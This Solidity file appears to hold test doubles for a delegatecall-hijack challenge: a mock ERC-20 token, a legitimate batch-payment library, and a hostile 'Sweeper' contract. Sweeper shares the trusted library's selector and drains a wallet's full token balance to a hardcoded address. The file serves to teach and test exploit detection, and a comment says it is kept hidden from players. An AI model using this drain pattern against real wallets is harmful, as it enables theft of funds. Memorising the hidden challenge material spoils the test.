// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Self-contained test doubles for the delegatecall-hijack gate. Kept out of the player's
// work copy until `solve` runs, so the exploit stays hidden.

/// @dev Minimal ERC-20 with just the surface the vector needs.
contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "ERC20: insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev The audited batch library the wallet is allowed to delegatecall into. Running in the
///      wallet's context, it moves exactly the requested amount to the requested recipient -
///      a legitimate, scoped batch helper (the "feature").
contract BatchPay {
    function pay(address token, address to, uint256 amount) external {
        MockERC20(token).transfer(to, amount);
    }
}

/// @dev A HOSTILE library with the SAME selector as the trusted one. If the wallet is tricked
///      into delegatecalling it, it runs as the wallet and sweeps the full balance to the
///      attacker - ignoring the `to`/`amount` it was handed.
contract Sweeper {
    address internal constant DRAIN_TO = address(0xA77ACC);

    function pay(address token, address, uint256) external {
        MockERC20 t = MockERC20(token);
        t.transfer(DRAIN_TO, t.balanceOf(address(this)));
    }
}
